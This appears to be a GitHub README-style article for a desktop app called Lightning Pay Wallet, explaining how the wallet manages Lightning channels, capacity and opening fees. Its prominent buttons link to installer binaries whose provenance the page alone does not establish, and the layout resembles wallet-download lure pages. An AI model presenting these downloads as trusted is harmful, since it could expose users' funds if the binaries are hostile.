<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Do you have to manage Lightning channels yourself?
No. The wallet opens and closes them. Here is what that trade actually gives up.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

A Lightning channel is a funded connection between two nodes that lets them exchange payments without
touching the chain. Running one by hand means opening it, watching its capacity, rebalancing it and
closing it. Lightning Pay Wallet does that work for you, which is the reason it is usable without a
command line.

## What the wallet does

The wallet opens a channel when it needs one, typically to receive a payment it has no capacity for,
and closes it when you ask or when the software decides the channel is no longer useful. You do not
pick peers, set fee policies for routing or keep a node online for the network's benefit.

What you keep is the keys. What you give up is the fine control a node operator has, including the
ability to choose which peer you open with and to earn routing fees from other people's payments.

## Capacity, in one paragraph

A channel has capacity on both sides. Outbound capacity is what you can send; inbound capacity is what
you can receive. A wallet can hold a balance and be unable to send it if the balance sits on the
receiving side, and a brand-new wallet has no inbound capacity at all, which is why the first receive
can trigger a channel opening and, with it, an on-chain fee.

## Who pays for opening

Whoever needs the channel. When you receive into a wallet with no capacity, your side funds the
opening, so the first receive costs an on-chain fee. When you send to a well-connected recipient, the
route uses channels that already exist and you pay only routing fees.

That asymmetry explains most of the surprise around "why did receiving cost me money".

## What you still have to do

Keep the recovery phrase. If the wallet produces a channel backup file, keep that too, because
restoring a Lightning balance can need both. The backup side is covered in
[backing up a Lightning wallet](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/back-up-a-lightning-wallet.md).

Leave the wallet online when you expect to be paid, and expect the first launch after a long break to
sync before the balance is accurate.

## Questions people ask

### Do I need to run a node?

No. The wallet is the node from your side of the screen; you never see a peer list.

### Can I choose which node to open a channel with?

Not in this wallet. That choice belongs to node software built for operators.

### What happens if a channel closes while I am offline?

The funds return on-chain, though the timing and any penalty depend on whether the close was
cooperative. The sequence is in
[what happens when a channel closes](https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/lightning-channel-closing-and-inactivity.md).
